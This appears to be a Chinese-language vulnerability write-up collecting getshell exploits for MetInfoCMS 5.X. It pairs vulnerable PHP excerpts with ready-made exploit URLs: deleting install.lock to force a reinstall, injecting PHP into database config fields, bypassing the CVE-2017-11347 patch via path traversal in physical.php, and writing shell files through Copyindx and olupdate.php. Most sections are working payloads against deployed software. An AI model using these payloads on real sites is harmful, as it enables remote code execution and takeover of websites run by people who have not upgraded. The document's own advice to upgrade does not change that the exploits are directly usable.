MetInfoCMS 5.X版本GETSHELL漏洞合集  

## 0x00 前言

2018年1月底MetInfoCMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。

## 0x01安装过程过滤不严导致Getshell

*前提:有删除/config/install.lock权限*
> 默认安装的时候设置了权限的@chmod('../config/install.lock',0554);，所以需要在权限修改了的情况下才能利用这个

### 1. 结合网上爆出的后台任意文件删除漏洞

```php
#/admin/app/batch/csvup.php

$classflie=explode('_',$fileField);
$classflie=explode('-',$classflie[count($classflie)-1]);
$class1=$classflie[0];
$class2=$classflie[1];
$class3=$classflie[2];
$class=$class3?$class3:($class2?$class2:$class1); 
$classcsv=$db->get_one("select * from $met_column where id=$class");
if(!$classcsv){
metsave("../app/batch/contentup.php?anyid=$anyid&lang=$lang",$lang_csvnocolumn,$depth);
}

# 省略代码

@file_unlink($flienamecsv);
```

删除/config/install.lock文件可以导致重装（需要由对应的删除权限），删除文件的poc如下：

```html
http://xxx.com/admin/app/batch/csvup.php?fileField=1_1231-1&flienamecsv=../../../config/install.lock
```

### 2. 重装时数据库配置文件过滤不当

```php
#/install/index.php
    case 'db_setup':
    {
        if($setup==1){
            $db_prefix      = trim($db_prefix);
            $db_host        = trim($db_host);
            $db_username    = trim($db_username);
            $db_pass        = trim($db_pass);
            $db_name        = trim($db_name);
            $config="<?php
                   /*
                   con_db_host = \"$db_host\"
                   con_db_id   = \"$db_username\"
                   con_db_pass    = \"$db_pass\"
                   con_db_name = \"$db_name\"
                   tablepre    =  \"$db_prefix\"
                   db_charset  =  \"utf8\";
                  */
                  ?>";

            $fp=fopen("../config/config_db.php",'w+');
            fputs($fp,$config);
            fclose($fp);
```

在数据库配置时$db_host,$db_username,$db_pass,$db_name,$db_prefix参数可控。

### 3. POC

数据库配置时修改任意参数为`*/phpinfo();/*`可导致Getshell。点击保存之后，直接访问/config/config_db.php即可getshell。
shell地址:`http://xxx.com/config/config_db.php`

## 0x02 CVE-2017-11347补丁绕过继续Getshell

*前提：windows服务器+网站绝对路径（只需要知道网站index.php所在目录的上一级目录名）*

### 1. 查找绝对路径的方法：

- 利用安装目录下的phpinfo文件： `/install/phpinfo.php`

- 利用报错信息(

  信息在HTML注释中，必须通过查看网页源码的方式才能获取内容，否则看上去是空白页

  )

  ```
  /app/system/include/public/ui/admin/top.php
  /app/system/include/public/ui/admin/box.php
  /app/system/include/public/ui/web/sidebar.php
  ```

### 2. 漏洞分析

5.3.19版本针对CVE-2017-11347的补丁分析

```
switch($val[2]){
   case 1:
      $address="../about/$fileaddr[1]";
   break;
   case 2:
      $address="../news/$fileaddr[1]";
   break;
   case 3:
      $address="../product/$fileaddr[1]";
   break;
   case 4:
      $address="../download/$fileaddr[1]";
   break;
   case 5:
      $address="../img/$fileaddr[1]";
   break;
   case 8:
      $address="../feedback/$fileaddr[1]";
   break;
   default:
      $address = "";
   break;

}   
   $newfile  ="../../../$val[1]"; 
   if($address != ''){
      Copyfile($address,$newfile);
   }

}
}
```

即：5.3.19版本采取：即使在$var[2]为空时，默认给address变量赋值为空，并且会判断address参数不为空才调用Copyfile。但是当$var[2]不为空时，由于fileaddr[1]可控导致，仍然可以控制文件路径从而Getshell。

漏洞利用(网站安装在服务器根路径的情况)：

第一步，新建1.ico文件，内容为：<?php phpinfo();?>
在后台"地址栏图标"处上传该文件。
得到地址为：http://localhost/upload/file/1506587082.ico

第二步，发送如下payload(注意左斜杠和右斜杠不能随意更改):

```
http://localhost/admin/app/physical/physical.php?action=op&op=3&valphy=test|/..\upload\file\1506587082.ico/..\..\..\www\about\shell.php|1
```

shell的地址为：

```
http://localhost/about/shell.php
```

### 3. POC(注意左斜杠和右斜杠不能随意更改)：

```
http://localhost/admin/app/physical/physical.php?action=op&op=3&valphy=test|/..\上传ico文件的相对路径/..\..\..\网站index.php路径的上一层目录名\about\webshell的文件名|1
```

特别注意其中的：“网站index.php上层目录名”，

1.如果网站安装在服务器根目录，这wamp/phpstudy默认目录值为“www"；网站index.php上层目录名设置为"www"; 如果为lamp环境，这默认目录值为“html”网站index.php上层目录名设置为"html";。其他的环境类推（利用绝对路径泄露）。

2.如果网站安装在服务器的二级目录下，则网站index.php上层目录名设置为二级目录名。

例如:网站搭建在:http://localhost/MetInfoCMS /,则第二步的payload如下：

```
http://localhost/MetInfoCMS/admin/app/physical/physical.php?action=op&op=3&valphy=test|/..\upload\file\1506588072.ico/..\MetInfoCMS.\MetInfoCMS \about\shell.php|1
```

相应生成的shell地址为：

```
http://localhost/MetInfoCMS/about/shell.php
```

## 0x03 Copyindx函数处理不当Getshell

### 1. 声明

此漏洞点位于admin/app/physical/physical.php文件，漏洞和CVE-2017-11347漏洞十分相似，但是存在根本的差异，不同点如下：

（1）触发函数是Copyindex函数，而非Copyfile

（2）此漏洞不是利用文件包含require_one，而是利用任意内容写入

（3）此漏洞Getshell不需要上传图片

（4）结合CSRF可以实现一键Getshell

### 2. 漏洞点

```
# admin/app/physical/physical.php:197-236

switch($op){
   case 1:
   if(is_dir('../../../'.$val[1])){
      deldir('../../../'.$val[1]);
      echo $lang_physicaldelok;
   }
   else{unlink('../../../'.$val[1]);
      echo $lang_physicaldelok;
      }
   break;
   case 2:
      $adminfile=$url_array[count($url_array)-2];
      $strsvalto=readmin($val[1],$adminfile,1);
      filetest('../../../'.$val[1]);
      deldir('../../../'.$val[1]);
      $dlappfile=parse_ini_file('dlappfile.php',true);
      if($dlappfile[$strsvalto]['dlfile']){
         $return=varcodeb('app');
         $checksum=$return['md5'];
         $met_file='/dl/app_curl.php';
         $stringfile=dlfile($dlappfile[$strsvalto]['dlfile'],"../../../$val[1]");
      }else{
         $met_file='/dl/olupdate_curl.php';
         $stringfile=dlfile("v$metcms_v/$strsvalto","../../../$val[1]");
      }
      if($stringfile==1){
         echo $lang_physicalupdatesuc;
      }
      else{
         echo dlerror($stringfile);
         die();
      }
   break;
   case 3:
      $fileaddr=explode('/',$val[1]);
      $filedir="../../../".$fileaddr[0];  
      if(!file_exists($filedir)){ @mkdir ($filedir, 0777); } 
      if($fileaddr[1]=="index.php"){
         Copyindx("../../../".$val[1],$val[2]);
      }
```

当$action等于op而且$op等于3的时候，如果$filedir不存在则创建$filedir目录，而且如果$fileaddr[1]等于"index.php"则调用Copyindex函数，并传入$val[1]和$val[2]参数，此处两个参数来自变量$valphy,均可控！！跟进Copyindex函数源码如下：

```
#admin/include/global.func.php:877-884

function Copyindx($newindx,$type){
   if(!file_exists($newindx)){
      $oldcont ="<?php\n# xxx Enterprise Content Management System \n# Copyright (C) xxx Co.,Ltd (http://www.xxx.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) xxx Co., Ltd. (http://www.xxx.cn). All rights reserved.\n?>";
      $fp = fopen($newindx,w);
      fputs($fp, $oldcont);
      fclose($fp);
   }
}
```

可见，直接把参数$type直接赋值给$fmodule,并写入文件内容，所以可以构造payload直接getshell.

### 3. POC(xxx为任意的shell目录，index.php文件名不能修改)

生成的shell地址：

```
http://localhost/MetInfoCMS/xxx/index.php
```

## 0x04 olupdate文件缺陷导致Getshell

### 1. 漏洞点

```
#/admin/system/olupdate.phpwen文件中，当$action=sql,$sql!=No Date且$sqlfile不是数组时进入如下过程

#326-360行
$num=1;
$random = met_rand(6);
$date=date('Ymd',time());
require_once '../system/database/global.func.php';
do{
    $sqldump = '';
    $startrow = '';
    $tables=tableprearray($tablepre);
    $sizelimit=2048;
    $tableid = isset($tableid) ? $tableid - 1 : 0;
    $startfrom = isset($startfrom) ? intval($startfrom) : 0;
    $tablenumber = count($tables);
    for($i = $tableid; $i < $tablenumber && strlen($sqldump) < $sizelimit * 1000; $i++){
        $sqldump .= sql_dumptable($tables[$i], $startfrom, strlen($sqldump));
        $startfrom = 0;
    }
    $startfrom = $startrow;
    $tableid = $i;
    if(trim($sqldump)){
        $sqlfile[]=$bakfile = "../update/$addr/{$con_db_name}_{$date}_{$random}_{$num}.sql";
        $version='version:'.$metcms_v;
        $sqldump = "#xxx.cn Created {$version} \n#{$met_weburl}\n#{$tablepre}\n#{$met_webkeys}\n# --------------------------------------------------------\n\n\n".$sqldump;
        if(!file_put_contents($bakfile, $sqldump)){
            dl_error($lang_updaterr2."({$adminfile}/update/$addr/{$con_db_name}_{$date}_{$random}_{$num}.sql)",$type,$olid,$ver,$addr,$action);
        }
    }
    $num++;
}
while(trim($sqldump));
if(is_array($sqlfile)) $string = "<?php\n \$sqlfile = ".var_export($sqlfile, true)."; ?>";
filetest("../update/$addr/sqlist.php");
if(!file_put_contents("../update/$addr/sqlist.php",$string)){
    dl_error($lang_updaterr2."({$adminfile}/update/$addr/sqlist.php)",$type,$olid,$ver,$addr,$action);
}
```

此时由于sqlfile不是数组，即is_array($sqlfile)不成立，导致$string没有初始化，可以任意修改，接着调用file_put_contents将string的值写到/update/$addr/sqlist.php文件。

*PS:这里有一个小点,由于输入控制sqlfile不是数组，第345行执行$sqlfile[]=$bakfile = "../update/$addr/{$con_dbname}{$date}{$random}{$num}.sql";会导致给字符串赋值报错，导致无法执行到后面的Getshell部分。所以需要构造payload使得trim($sqldump)为空，即$sqldump值为空，从而跳过$sqlfile[]赋值部分，这里构造tableid=1000(其实只要>=44即可)*

最后的payload结构如下：

```
/admin/system/olupdate.php?action=sql&sqlfile=1&string=shell内容&addr=shell的目录&tableid=1000
```

### 2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)

```
http://xxx.com/admin/system/olupdate.php?action=sql&sqlfile=1&string=<?php phpinfo();?>&addr=12313&tableid=1000
```

执行后的shell地址：

```
http://xxx.com/admin/update/12313/sqlist.php
```

## 0x05小结

都是需要后台管理员权限才能利用的漏洞，不过危害还是比较大，没有升级的网站赶紧升级6.0版本哦！
前几个都有一定的条件要求，后面两个比较通杀!